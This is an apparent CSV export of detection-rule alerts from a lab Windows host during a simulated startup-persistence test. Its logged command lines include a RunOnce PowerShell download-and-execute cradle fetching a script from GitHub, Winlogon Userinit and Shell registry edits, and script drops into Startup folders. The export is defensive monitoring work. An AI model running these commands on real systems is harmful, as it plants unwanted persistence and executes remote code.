"2025-12-26 11:18:55.812 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173588,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.603 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173597,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.601","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173601,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.613","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.507 +01:00","Startup Folder File Write","med","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Persis","T1547.001","sysmon",173607,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:06.506 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.506","file_event_win_startup_folder_file_write.yml","daaf04a9-5b60-e331-6611-a3a32797e550","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173570,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173574,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.803 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173582,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.802","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173586,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.809","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173595,"Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","Suspicious Startup Folder Persistence","high","DESKTOP-G2OBL3D","Sysmon",11,"PrivEsc ¦ Exec ¦ Persis","T1204.002 ¦ T1547.001","sysmon",173599,"Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ RuleName: T1023 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","file_event_win_susp_startup_folder_persistence.yml","42eda6ab-d3b1-98fa-2f6a-5ff1382daca6","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.429 +01:00","System Information Discovery via Registry Queries","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",173629,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:16.419","proc_creation_win_discovery_via_reg_queries.yml","171d769f-2110-367f-ead2-6d7a7afd0c46","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.103 +01:00","System Information Discovery via Registry Queries","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",173633,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.088","proc_creation_win_discovery_via_reg_queries.yml","171d769f-2110-367f-ead2-6d7a7afd0c46","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:44.301 +01:00","Suspicious Execution of Hostname","low","DESKTOP-G2OBL3D","Sysmon",1,"Disc","T1082","sysmon",173556,"Cmdline: ""C:\WINDOWS\system32\HOSTNAME.EXE"" ¦ Proc: C:\Windows\System32\HOSTNAME.EXE ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1252 ¦ PGUID: E9F06A57-6104-694E-6701-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Hostname APP ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2161 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: hostname.exe ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:44.297","proc_creation_win_hostname_execution.yml","cd4f18d8-b261-1a76-2600-f039cd6f0310","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","PowerShell Download and Execution Cradles","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_download_iex.yml","745811d2-f9b3-6c05-f1f8-b245b4d26b9f","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","PowerShell Download Pattern","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_download_patterns.yml","9c070b47-5e34-6e96-ccce-205111752ae3","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","Suspicious PowerShell Invocations - Specific - ProcessCreation","med","DESKTOP-G2OBL3D","Sysmon",1,"Evas","","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_invocation_specific.yml","e554e422-7cda-2292-0e64-7595a12743dd","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.961 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173568,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:53.942","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.225 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173580,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript 